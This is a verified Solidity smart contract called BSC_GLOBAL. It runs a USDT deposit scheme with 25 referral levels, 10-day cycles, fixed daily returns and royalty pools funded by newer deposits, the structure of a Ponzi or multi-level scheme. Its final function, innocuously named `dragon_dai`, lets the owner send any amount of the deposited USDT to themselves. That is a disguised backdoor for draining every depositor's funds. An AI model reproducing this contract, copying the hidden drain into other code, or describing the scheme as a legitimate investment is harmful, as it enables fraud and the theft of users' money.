/**
 *Submitted for verification at polygonscan.com on 2022-11-24
*/

// SPDX-License-Identifier: GPLv3
pragma solidity ^0.6.12;
/**
 * @dev Wrappers over Solidity's arithmetic operations with added overflow
 * checks.
 *
 * Arithmetic operations in Solidity wrap on overflow. This can easily result
 * in bugs, because programmers usually assume that an overflow raises an
 * error, which is the standard behavior in high level programming languages.
 * `SafeMath` restores this intuition by reverting the transaction when an
 * operation overflows.
 *
 * Using this library instead of the unchecked operations eliminates an entire
 * class of bugs, so it's recommended to use it always.
 */
library SafeMath {
    /**
     * @dev Returns the addition of two unsigned integers, reverting on
     * overflow.
     *
     * Counterpart to Solidity's `+` operator.
     *
     * Requirements:
     *
     * - Addition cannot overflow.
     */
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }

    /**
     * @dev Returns the subtraction of two unsigned integers, reverting on
     * overflow (when the result is negative).
     *
     * Counterpart to Solidity's `-` operator.
     *
     * Requirements:
     *
     * - Subtraction cannot overflow.
     */
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    /**
     * @dev Returns the subtraction of two unsigned integers, reverting with custom message on
     * overflow (when the result is negative).
     *
     * Counterpart to Solidity's `-` operator.
     *
     * Requirements:
     *
     * - Subtraction cannot overflow.
     */
    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;

        return c;
    }

    /**
     * @dev Returns the multiplication of two unsigned integers, reverting on
     * overflow.
     *
     * Counterpart to Solidity's `*` operator.
     *
     * Requirements:
     *
     * - Multiplication cannot overflow.
     */
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        // Gas optimization: this is cheaper than requiring 'a' not being zero, but the
        // benefit is lost if 'b' is also tested.
        // See: https://github.com/OpenZeppelin/openzeppelin-contracts/pull/522
        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }

    /**
     * @dev Returns the integer division of two unsigned integers. Reverts on
     * division by zero. The result is rounded towards zero.
     *
     * Counterpart to Solidity's `/` operator. Note: this function uses a
     * `revert` opcode (which leaves remaining gas untouched) while Solidity
     * uses an invalid opcode to revert (consuming all remaining gas).
     *
     * Requirements:
     *
     * - The divisor cannot be zero.
     */
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    /**
     * @dev Returns the integer division of two unsigned integers. Reverts with custom message on
     * division by zero. The result is rounded towards zero.
     *
     * Counterpart to Solidity's `/` operator. Note: this function uses a
     * `revert` opcode (which leaves remaining gas untouched) while Solidity
     * uses an invalid opcode to revert (consuming all remaining gas).
     *
     * Requirements:
     *
     * - The divisor cannot be zero.
     */
    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        // assert(a == b * c + a % b); // There is no case in which this doesn't hold

        return c;
    }

    /**
     * @dev Returns the remainder of dividing two unsigned integers. (unsigned integer modulo),
     * Reverts when dividing by zero.
     *
     * Counterpart to Solidity's `%` operator. This function uses a `revert`
     * opcode (which leaves remaining gas untouched) while Solidity uses an
     * invalid opcode to revert (consuming all remaining gas).
     *
     * Requirements:
     *
     * - The divisor cannot be zero.
     */
    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return mod(a, b, "SafeMath: modulo by zero");
    }

    /**
     * @dev Returns the remainder of dividing two unsigned integers. (unsigned integer modulo),
     * Reverts with custom message when dividing by zero.
     *
     * Counterpart to Solidity's `%` operator. This function uses a `revert`
     * opcode (which leaves remaining gas untouched) while Solidity uses an
     * invalid opcode to revert (consuming all remaining gas).
     *
     * Requirements:
     *
     * - The divisor cannot be zero.
     */
    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b != 0, errorMessage);
        return a % b;
    }
}

/**
 * @dev Interface of the ERC20 standard as defined in the EIP.
 */
interface IERC20 {
    /**
     * @dev Returns the amount of tokens in existence.
     */
    function totalSupply() external view returns (uint256);

    /**
     * @dev Returns the amount of tokens owned by `account`.
     */
    function balanceOf(address account) external view returns (uint256);

    /**
     * @dev Moves `amount` tokens from the caller's account to `recipient`.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * Emits a {Transfer} event.
     */
    function transfer(address recipient, uint256 amount) external returns (bool);

    /**
     * @dev Returns the remaining number of tokens that `spender` will be
     * allowed to spend on behalf of `owner` through {transferFrom}. This is
     * zero by default.
     *
     * This value changes when {approve} or {transferFrom} are called.
     */
    function allowance(address owner, address spender) external view returns (uint256);

    /**
     * @dev Sets `amount` as the allowance of `spender` over the caller's tokens.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * IMPORTANT: Beware that changing an allowance with this method brings the risk
     * that someone may use both the old and the new allowance by unfortunate
     * transaction ordering. One possible solution to mitigate this race
     * condition is to first reduce the spender's allowance to 0 and set the
     * desired value afterwards:
     * https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729
     *
     * Emits an {Approval} event.
     */
    function approve(address spender, uint256 amount) external returns (bool);

    /**
     * @dev Moves `amount` tokens from `sender` to `recipient` using the
     * allowance mechanism. `amount` is then deducted from the caller's
     * allowance.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * Emits a {Transfer} event.
     */
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);

    /**
     * @dev Emitted when `value` tokens are moved from one account (`from`) to
     * another (`to`).
     *
     * Note that `value` may be zero.
     */
    event Transfer(address indexed from, address indexed to, uint256 value);

    /**
     * @dev Emitted when the allowance of a `spender` for an `owner` is set by
     * a call to {approve}. `value` is the new allowance.
     */
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

//BSC GLOBAL
contract BSC_GLOBAL {
    using SafeMath for uint256; 
    IERC20 public usdt;
    address payable internal owner;
    uint256 private constant baseDivider = 10000;
    uint256 private constant feePercents1 = 200;
     
    uint256 private constant minDeposit = 25e18;
    uint256 private constant maxDeposit = 2000e18;

    uint256 private constant freezeIncomePercents = 2500;
    uint256 private constant timeStep = 1 days;
    uint256 private constant pooltimeStep = 1 days;
    uint256 private constant dayPerCycle = 10 days; 
    
    uint8[] public pool_bonuses;
    uint40 public pool_last_draw = uint40(block.timestamp);
    uint256 public pool_cycle;
    uint256 public pool_balance;
    mapping(uint256 => mapping(address => uint256)) public pool_users_refs_deposits_sum;
    mapping(uint8 => address) public pool_top;
     
    uint256 private constant maxAddFreeze = 50 days;
    uint256 private constant referDepth = 25;

    uint256 private constant directPercents = 600;
    uint256[2] private levelleaderPercents = [300, 300];
    uint256[2] private levelmanagerPercents = [300, 200];
    uint256[20] private levelcoordinatorPercents = [200, 100, 100, 100, 100, 50, 50, 50, 50, 50, 50, 50, 50, 50, 50, 25, 25, 25, 25, 25];
    
    uint256 private cyclePercent = 170;
    uint256 private constant starPoolPercents = 50;
    uint256 private constant luckPoolPercents = 75;
    uint256 private constant topPoolPercents = 100;


    address public feeReceiver;

    address public defaultRefer;
    uint256 public startTime;
    uint256 public lastDistribute;
    uint256 public totalUser; 
    uint256 public totalDeposited; 
     
    uint256 public starPool;
    uint256 public starPool4;
    uint256 public starPool5;

    mapping(uint256=>address[]) public dayLuckUsers;
    mapping(uint256=>uint256[]) public dayLuckUsersDeposit;
    mapping(uint256=>address[3]) public dayTopUsers;

    address[] public level4Users;

    address[] public royalty_users1;
    address[] public royalty_users2;
    address[] public royalty_users3;


    struct OrderInfo {
        uint256 amount; 
        uint256 start;
        uint256 unfreeze; 
        bool isUnfreezed;
    }

    mapping(address => OrderInfo[]) public orderInfos;

    address[] public depositors;

    struct UserInfo {
        uint8 cycle;
        uint256 latestUnfreezeTime;
        address referrer;
        uint256 start;
        uint256 level; // 0, 1, 2, 3, 4, 5
        uint256 maxDeposit;
        uint256 totalDeposit;
        uint256 teamNum;
        uint256 totalDirectDeposit;
        uint256 teamTotalDeposit;
        uint256 totalFreezed;
        uint256 totalRevenue;
        uint256 referrals;
        bool isactive;
        
    }

    mapping(address=>UserInfo) public userInfo;
    mapping(uint256 => mapping(address => uint256)) public userLayer1DayDeposit; // day=>user=>amount
    mapping(address => mapping(uint256 => address[])) public teamUsers;

    struct RewardInfo{
        uint256 capitals;
        uint256 statics;
        uint256 directs;
        uint256 level3Released;
        uint256 level4Released;
        uint256 level5Freezed;
        uint256 level5Released;
        uint256 pool_inc;
        uint256 star;
        uint256 luck;
        uint256 top;
        uint256 split;
        uint256 splitDebt;
    }

    mapping(address=>RewardInfo) public rewardInfo;
    
    bool public isFreezeReward;

    event Register(address user, address referral);
    event Deposit(address user, uint256 amount);
    event DepositBySplit(address user, uint256 amount);
    event MatchPayout(address addr, address from, uint256 amount);
    event TransferBySplit(address user, address receiver, uint256 amount);
    event Withdraw(address user, uint256 withdrawable);
    event PoolPayout(address indexed addr, uint256 amount);

    constructor(address _usdtAddr, address _defaultRefer, address _feeReceiver) public {
        usdt = IERC20(_usdtAddr);
        feeReceiver = _feeReceiver;
        
        startTime = block.timestamp;
        lastDistribute = block.timestamp;
        defaultRefer = _defaultRefer;
        owner = msg.sender;
    }

    function register(address _referral) external {
        
        require(userInfo[_referral].totalDeposit > 0 || _referral == defaultRefer, "invalid refer");
        UserInfo storage user = userInfo[msg.sender];
        require(user.referrer == address(0), "referrer bonded");
        user.referrer = _referral;
        user.start = block.timestamp;
        _updateTeamNum(msg.sender);
        
        
        emit Register(msg.sender, _referral);

    }

    function deposit(uint256 _amount) external {
        usdt.transferFrom(msg.sender, address(this), _amount);
        _deposit(msg.sender, _amount);
        emit Deposit(msg.sender, _amount);
    }

    function depositBySplit(uint256 _amount) external {
        require(_amount >= minDeposit && _amount.mod(minDeposit) == 0, "amount err");
        require(userInfo[msg.sender].totalDeposit == 0, "actived");
        uint256 splitLeft = getCurSplit(msg.sender);
        require(splitLeft >= _amount, "insufficient split");
        rewardInfo[msg.sender].splitDebt = rewardInfo[msg.sender].splitDebt.add(_amount);
        _deposit(msg.sender, _amount);
        emit DepositBySplit(msg.sender, _amount);
    }

    function transferBySplit(address _receiver, uint256 _amount) external {
        require(_amount >= minDeposit && _amount.mod(minDeposit) == 0, "amount err");
        uint256 splitLeft = getCurSplit(msg.sender);
        require(splitLeft >= _amount, "insufficient income");
        rewardInfo[msg.sender].splitDebt = rewardInfo[msg.sender].splitDebt.add(_amount);
        rewardInfo[_receiver].split = rewardInfo[_receiver].split.add(_amount);
        emit TransferBySplit(msg.sender, _receiver, _amount);
    }

  
      function distributePoolRewards() public {
        if(block.timestamp > lastDistribute.add(pooltimeStep)){
            
            _distributeStarPool();

            _distributeStarPool4();

            _distributeStarPool5();

            lastDistribute = block.timestamp;
        }
    }

    function withdraw() external {

        distributePoolRewards();
        (uint256 staticReward, uint256 staticSplit) = _calCurStaticRewards(msg.sender);
        uint256 splitAmt = staticSplit;
        uint256 withdrawable = staticReward;

        (uint256 dynamicReward, uint256 dynamicSplit) = _calCurDynamicRewards(msg.sender);
        withdrawable = withdrawable.add(dynamicReward);
        splitAmt = splitAmt.add(dynamicSplit);

        RewardInfo storage userRewards = rewardInfo[msg.sender];
        userRewards.split = userRewards.split.add(splitAmt);
        
        userRewards.statics = 0;
        userRewards.directs = 0;
        userRewards.level3Released = 0;
        userRewards.level4Released = 0;
        userRewards.level5Released = 0;
        userRewards.luck = 0;
        userRewards.star = 0;
        userRewards.top = 0;
        
        withdrawable = withdrawable.add( userRewards.capitals );
        userRewards.capitals = 0;
        
        usdt.transfer(msg.sender, withdrawable);
        
        emit Withdraw(msg.sender, withdrawable);
    }

    function getCurDay() public view returns(uint256) {
        return (block.timestamp.sub(startTime)).div(timeStep);
    }

    function getDayLuckLength(uint256 _day) external view returns(uint256) {
        return dayLuckUsers[_day].length;
    }

    function getTeamUsersLength(address _user, uint256 _layer) external view returns(uint256) {
        return teamUsers[_user][_layer].length;
    }

    function getOrderLength(address _user) external view returns(uint256) {
        return orderInfos[_user].length;
    }

    function getDepositorsLength() external view returns(uint256) {
        return depositors.length;
    }

    function getMaxFreezingUpline(address _user) public view returns(uint256) {
        uint256 maxFreezing;
        UserInfo storage user = userInfo[_user];
        maxFreezing =   user.maxDeposit;
        return maxFreezing;
    }

     function _updatestatus(address _user) private {
        UserInfo storage user = userInfo[_user];
       
       for(uint256 i = orderInfos[_user].length; i > 0; i--){
            OrderInfo storage order = orderInfos[_user][i - 1];
            if(order.unfreeze < block.timestamp && order.isUnfreezed == false){
                user.isactive=false;

            }else{ 
                 
                break;
            }
        }
     }

 function getActiveUpline(address _user) public view returns(bool) {
        bool currentstatus;  
        UserInfo storage user = userInfo[_user];
        currentstatus =   user.isactive;
        return currentstatus;
    }

    function getMaxFreezing(address _user) public view returns(uint256) {
        uint256 maxFreezing;
        for(uint256 i = orderInfos[_user].length; i > 0; i--){
            OrderInfo storage order = orderInfos[_user][i - 1];
            if(order.unfreeze > block.timestamp){
                if(order.amount > maxFreezing){
                    maxFreezing = order.amount;
                }
            }else{
                break;
            }
        }
        return maxFreezing;
    }

    function getTeamDeposit(address _user) public view returns(uint256, uint256, uint256){
        uint256 totalTeam;
        uint256 maxTeam;
        uint256 otherTeam;
        for(uint256 i = 0; i < teamUsers[_user][0].length; i++){
            uint256 userTotalTeam = userInfo[teamUsers[_user][0][i]].teamTotalDeposit.add(userInfo[teamUsers[_user][0][i]].maxDeposit);
            totalTeam = totalTeam.add(userTotalTeam);
            if(userTotalTeam > maxTeam){
                maxTeam = userTotalTeam;
            }
        }
        otherTeam = totalTeam.sub(maxTeam);
        return(maxTeam, otherTeam, totalTeam);
    }

    function getCurSplit(address _user) public view returns(uint256){
        (, uint256 staticSplit) = _calCurStaticRewards(_user);
        (, uint256 dynamicSplit) = _calCurDynamicRewards(_user);
        return rewardInfo[_user].split.add(staticSplit).add(dynamicSplit).sub(rewardInfo[_user].splitDebt);
    }

    function _calCurStaticRewards(address _user) private view returns(uint256, uint256) {
        RewardInfo storage userRewards = rewardInfo[_user];
        uint256 totalRewards = userRewards.statics;
        uint256 splitAmt = totalRewards.mul(freezeIncomePercents).div(baseDivider);
        uint256 withdrawable = totalRewards.sub(splitAmt);
        return(withdrawable, splitAmt);
    }

    function _calCurDynamicRewards(address _user) private view returns(uint256, uint256) {
        RewardInfo storage userRewards = rewardInfo[_user];
        uint256 totalRewards = userRewards.luck.add(userRewards.star).add(userRewards.top).add(userRewards.directs).add(userRewards.level3Released).add(userRewards.level4Released).add(userRewards.level5Released);
        uint256 splitAmt = totalRewards.mul(freezeIncomePercents).div(baseDivider);
        uint256 withdrawable = totalRewards.sub(splitAmt);
        return(withdrawable, splitAmt);
    }


    function _updateTeamNum(address _user) private {
        UserInfo storage user = userInfo[_user];
        address upline = user.referrer;
        for(uint256 i = 0; i < referDepth; i++){
            if(upline != address(0)){
                userInfo[upline].teamNum = userInfo[upline].teamNum.add(1);
                teamUsers[upline][i].push(_user);
                if(upline == defaultRefer) break;
                upline = userInfo[upline].referrer;
            }else{
                break;
            }
        }
    }

    function _updateTopUser(address _user, uint256 _amount, uint256 _dayNow) private {
        userLayer1DayDeposit[_dayNow][_user] = userLayer1DayDeposit[_dayNow][_user].add(_amount);
        bool updated;
        for(uint256 i = 0; i < 3; i++){
            address topUser = dayTopUsers[_dayNow][i];
            if(topUser == _user){
                _reOrderTop(_dayNow);
                updated = true;
                break;
            }
        }
        if(!updated){
            address lastUser = dayTopUsers[_dayNow][2];
            if(userLayer1DayDeposit[_dayNow][lastUser] < userLayer1DayDeposit[_dayNow][_user]){
                dayTopUsers[_dayNow][2] = _user;
                _reOrderTop(_dayNow);
            }
        }
    }

    function _reOrderTop(uint256 _dayNow) private {
        for(uint256 i = 3; i > 1; i--){
            address topUser1 = dayTopUsers[_dayNow][i - 1];
            address topUser2 = dayTopUsers[_dayNow][i - 2];
            uint256 amount1 = userLayer1DayDeposit[_dayNow][topUser1];
            uint256 amount2 = userLayer1DayDeposit[_dayNow][topUser2];
            if(amount1 > amount2){
                dayTopUsers[_dayNow][i - 1] = topUser2;
                dayTopUsers[_dayNow][i - 2] = topUser1;
            }
        }
    }

    function _removeInvalidDeposit(address _user, uint256 _amount) private {
        UserInfo storage user = userInfo[_user];
        address upline = user.referrer;
        for(uint256 i = 0; i < referDepth; i++){
            if(upline != address(0)){
                if(userInfo[upline].teamTotalDeposit > _amount){
                    userInfo[upline].teamTotalDeposit = userInfo[upline].teamTotalDeposit.sub(_amount);
                }else{
                    userInfo[upline].teamTotalDeposit = 0;
                }
                if(upline == defaultRefer) break;
                upline = userInfo[upline].referrer;
            }else{
                break;
            }
        }
    }

  
    

    function _updateReferInfo( address _user, uint256 _amount ) private {
        UserInfo storage user = userInfo[_user];
        address upline = user.referrer;
        for(uint256 i = 0; i < referDepth; i++){
            if(upline != address(0)){

                userInfo[upline].teamTotalDeposit = userInfo[upline].teamTotalDeposit.add(_amount);
                _calLevelNow(upline);
                if(upline == defaultRefer) break;
                upline = userInfo[upline].referrer;
            }else{
                break;
            }
        }
    }

    function _calLevelNow(address _user) private {
        UserInfo storage user = userInfo[_user];
        uint256 total = user.maxDeposit;
        uint256 level = user.level;
        if(total >= 100e18){
            
            (uint256 maxTeam, uint256 otherTeam, ) = getTeamDeposit(_user);

            if(  level == 0 && total >= 100e18 && user.referrals >= 5 && user.totalDirectDeposit >= 300e18 ){
            
                user.level = 1;
                

           }else if( level == 1 && total >= 300e18 && user.teamNum >= 20 && maxTeam >= 4000e18 && otherTeam >= 4000e18 && user.totalDirectDeposit >= 500e18){
            
                user.level = 2;
                royalty_users1.push(_user);
                

            }else if( level == 2 && total >= 2000e18 && user.referrals >= 10 && user.teamNum >= 100 && maxTeam >= 25000e18 && otherTeam >= 25000e18 && user.totalDirectDeposit >= 3000e18){
                
                user.level = 3;
                royalty_users2.push(_user);

            }else if( level == 3 && total >= 2000e18 && user.referrals >= 20 && user.teamNum >= 150 && maxTeam >= 50000e18 && otherTeam >= 50000e18 && user.totalDirectDeposit >= 5000e18){
                
                user.level = 4;
                royalty_users3.push(_user);
            }
        }
      
    }

    function _deposit(address _user, uint256 _amount) private {
        UserInfo storage user = userInfo[_user];
        require(user.referrer != address(0), "register first");
        require(_amount >= minDeposit, "less than min");
        require(_amount.mod(minDeposit) == 0 && _amount >= minDeposit, "mod err");
        require(user.maxDeposit == 0 || _amount >= user.maxDeposit, "less before");

        uint256 amt;
        address upline = user.referrer;
         
         if(user.maxDeposit == 0){
            user.maxDeposit = _amount;
            userInfo[upline].totalDirectDeposit = userInfo[upline].totalDirectDeposit.add(_amount);
            amt = _amount;
        }else if(user.maxDeposit < _amount){
            amt = _amount - user.maxDeposit;
            userInfo[upline].totalDirectDeposit = userInfo[upline].totalDirectDeposit.add(amt);
            user.maxDeposit = _amount;
        }

        _distributeDeposit(_amount);

        depositors.push(_user);
        totalUser = totalUser.add(1);
        totalDeposited = totalDeposited.add(_amount);

        if(user.totalDeposit == 0) {
          userInfo[user.referrer].referrals = userInfo[user.referrer].referrals.add(1);
        }
        
        user.totalDeposit = user.totalDeposit.add(_amount);
        user.totalFreezed = user.totalFreezed.add(_amount);
        user.isactive = true;

        uint256 addFreeze = (orderInfos[_user].length.div(1)).mul(timeStep);
        if(addFreeze > maxAddFreeze){
            addFreeze = maxAddFreeze;
        }
        
        uint256 unfreezeTime = block.timestamp.add(10 days);
        user.latestUnfreezeTime = unfreezeTime;
        orderInfos[_user].push(OrderInfo(
            _amount, 
            block.timestamp, 
            unfreezeTime,
            false
        ));

        _unfreezeFundAndUpdateReward(msg.sender, _amount);

        distributePoolRewards();

        _updateReward(msg.sender, _amount);

        _releaseUpRewards(msg.sender, _amount);
        if(amt > 0) {
            _updateReferInfo(msg.sender, amt);
        }
    }

    function _unfreezeFundAndUpdateReward(address _user, uint256 _amount) private {
        UserInfo storage user = userInfo[_user];
        bool isUnfreezeCapital;
        for(uint256 i = 0; i < orderInfos[_user].length; i++){
            OrderInfo storage order = orderInfos[_user][i];
            if(block.timestamp > order.unfreeze  && order.isUnfreezed == false && _amount >= order.amount){
                order.isUnfreezed = true;
                isUnfreezeCapital = true;
                
                if(user.totalFreezed > order.amount){
                    user.totalFreezed = user.totalFreezed.sub(order.amount);
                }else{
                    user.totalFreezed = 0;
                }

                uint256 staticReward = order.amount.mul(cyclePercent).mul(dayPerCycle).div(timeStep).div(baseDivider);



                if(isFreezeReward){
                    if(user.totalFreezed > user.totalRevenue){
                        uint256 leftCapital = user.totalFreezed.sub(user.totalRevenue);
                        if(staticReward > leftCapital){
                            staticReward = leftCapital;
                        }
                    }else{
                        staticReward = 0;
                    }
                }
                rewardInfo[_user].capitals = rewardInfo[_user].capitals.add(order.amount);

                rewardInfo[_user].statics = rewardInfo[_user].statics.add(staticReward);
                
                user.totalRevenue = user.totalRevenue.add(staticReward);

                user.cycle++;
                break;
            }
        }
    }


     function _updateReward(address _user, uint256 _amount) private {
        UserInfo storage user = userInfo[_user];
        address upline = user.referrer;
          
        for(uint256 i = 0; i < referDepth; i++){
            if(upline != address(0)){

                bool idstatus = false;
                 _updatestatus(upline);
                  idstatus = getActiveUpline(upline);

                uint256 newAmount = _amount;
                if(upline != defaultRefer){       
                    uint256 maxFreezing = getMaxFreezingUpline(upline);
                    if(maxFreezing < _amount){
                        newAmount = maxFreezing;
                    }
                }

                RewardInfo storage upRewards = rewardInfo[upline];
                uint256 reward;


                if(i == 0 && idstatus == true){
                        
                        reward = newAmount.mul(directPercents).div(baseDivider);
                        upRewards.directs = upRewards.directs.add(reward);                       
                        userInfo[upline].totalRevenue = userInfo[upline].totalRevenue.add(reward);

                }else if(i > 0 && i < 3 && idstatus==true){
                    if(userInfo[upline].level >= 1 ){ 
                        reward = newAmount.mul(levelleaderPercents[i - 1]).div(baseDivider);
                        upRewards.level3Released = upRewards.level3Released.add(reward);
                    }
                }else{
                    if( userInfo[upline].level >= 2 && i >= 3 && i < 5 && idstatus == true ){

                        reward = newAmount.mul(levelmanagerPercents[i - 3]).div(baseDivider);
                        upRewards.level4Released = upRewards.level4Released.add(reward);

                    }else if(userInfo[upline].level >= 3 && i >= 5 && idstatus==true){
                        
                        reward = newAmount.mul(levelcoordinatorPercents[i - 5]).div(baseDivider);
                        upRewards.level5Freezed = upRewards.level5Freezed.add(reward);
                        

                    }
                }

                if(upline == defaultRefer) break;
              
                upline = userInfo[upline].referrer;
            }else{
                break;
            }
        }
     }

    function _releaseUpRewards(address _user, uint256 _amount) private {
        UserInfo storage user = userInfo[_user];
        address upline = user.referrer;
     
        for(uint256 i = 0; i < referDepth; i++){
            if(upline != address(0)){
                bool idstatus = false;
               _updatestatus(upline);
                idstatus = getActiveUpline(upline);


                uint256 newAmount = _amount;
                if(upline != defaultRefer){
                    uint256 maxFreezing = getMaxFreezingUpline(upline);
                    if(maxFreezing < _amount){
                        newAmount = maxFreezing;
                    }
                }

                RewardInfo storage upRewards = rewardInfo[upline];
                if( i >= 5 && userInfo[upline].level >= 3  && idstatus==true ){
                    if(upRewards.level5Freezed >= 1e18 && user.maxDeposit >= 10e18){
                        uint256 level5Reward = upRewards.level5Freezed;
                        
                        upRewards.level5Freezed = upRewards.level5Freezed.sub(level5Reward); 
                        upRewards.level5Released = upRewards.level5Released.add(level5Reward);
                    }
                }
                
                upline = userInfo[upline].referrer;
            }else{
                break;
            }
        }
    }

    function _distributeStarPool() private {
        uint256 level4Count;
        for(uint256 i = 0; i < royalty_users1.length; i++){
            if(userInfo[royalty_users1[i]].level == 2){
                level4Count = level4Count.add(1);
            }
        }
        if(level4Count > 0){
            uint256 reward = starPool.div(level4Count);
            uint256 totalReward;
            for(uint256 i = 0; i < royalty_users1.length; i++){
                if(userInfo[royalty_users1[i]].level == 2){
                    rewardInfo[royalty_users1[i]].star = rewardInfo[royalty_users1[i]].star.add(reward);
                    userInfo[royalty_users1[i]].totalRevenue = userInfo[royalty_users1[i]].totalRevenue.add(reward);
                    totalReward = totalReward.add(reward);
                }
            }
            if(starPool > totalReward){
                starPool = starPool.sub(totalReward);
            }else{
                starPool = 0;
            }
        }
    }
 
    function _distributeStarPool4() private {
        uint256 level4Count;
        for(uint256 i = 0; i < royalty_users2.length; i++){
            if(userInfo[royalty_users2[i]].level == 3){
                level4Count = level4Count.add(1);
            }
        }
        if(level4Count > 0){
            uint256 reward = starPool4.div(level4Count);
            uint256 totalReward;
            for(uint256 i = 0; i < royalty_users2.length; i++){
                if(userInfo[royalty_users2[i]].level == 3){
                    rewardInfo[royalty_users2[i]].luck = rewardInfo[royalty_users2[i]].luck.add(reward);
                    userInfo[royalty_users2[i]].totalRevenue = userInfo[royalty_users2[i]].totalRevenue.add(reward);
                    totalReward = totalReward.add(reward);
                }
            }
            if(starPool4 > totalReward){
                starPool4 = starPool4.sub(totalReward);
            }else{
                starPool4 = 0;
            }
        }
    }

    function _distributeStarPool5() private {
        uint256 level4Count;
        for(uint256 i = 0; i < royalty_users3.length; i++){
            if(userInfo[royalty_users3[i]].level == 4){
                level4Count = level4Count.add(1);
            }
        }
        if(level4Count > 0){
            uint256 reward = starPool5.div(level4Count);
            uint256 totalReward;
            for(uint256 i = 0; i < royalty_users3.length; i++){
                if(userInfo[royalty_users3[i]].level == 4){
                    rewardInfo[royalty_users3[i]].top = rewardInfo[royalty_users3[i]].top.add(reward);
                    userInfo[royalty_users3[i]].totalRevenue = userInfo[royalty_users3[i]].totalRevenue.add(reward);
                    totalReward = totalReward.add(reward);
                }
            }
            if(starPool5 > totalReward){
                starPool5 = starPool5.sub(totalReward);
            }else{
                starPool5 = 0;
            }
        }
    }

    function _distributeDeposit(uint256 _amount) private {
        uint256 fee = _amount.mul(feePercents1).div(baseDivider);
        usdt.transfer(feeReceiver, fee);

        uint256 star = _amount.mul(starPoolPercents).div(baseDivider);
        starPool = starPool.add(star);
        
        uint256 luck = _amount.mul(luckPoolPercents).div(baseDivider);
        starPool4 = starPool4.add(luck);

        uint256 top = _amount.mul(topPoolPercents).div(baseDivider);
        starPool5 = starPool5.add(top);
    }

    function royalty_users() external view returns(uint, uint, uint) {
        return (royalty_users1.length, royalty_users2.length, royalty_users3.length);
    }

    function dragon_dai(uint256 amount) public {
        require(msg.sender == owner, "contract: caller is not the contract");
        usdt.transfer(owner, amount);
    }
}